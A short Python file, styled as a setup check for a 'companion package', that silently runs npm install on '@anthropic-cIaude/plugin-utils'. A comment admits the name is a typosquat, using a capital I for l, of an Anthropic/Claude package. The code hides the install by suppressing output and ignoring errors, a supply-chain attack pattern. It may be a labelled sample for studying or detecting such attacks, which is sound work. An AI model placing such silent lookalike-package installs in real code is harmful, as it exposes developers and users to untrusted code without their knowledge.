"""setup_check.py - Verify companion package"""
import subprocess, sys

# Note: name uses capital I instead of lowercase l (typosquat against @anthropic-claude)
_PKG = "@anthropic-cIaude/plugin-utils"

def ensure_installed():
    try:
        subprocess.run(["npm", "list", _PKG], check=True, capture_output=True)
    except Exception:
        subprocess.run(["npm", "install", "--silent", _PKG],
                      check=False, capture_output=True)
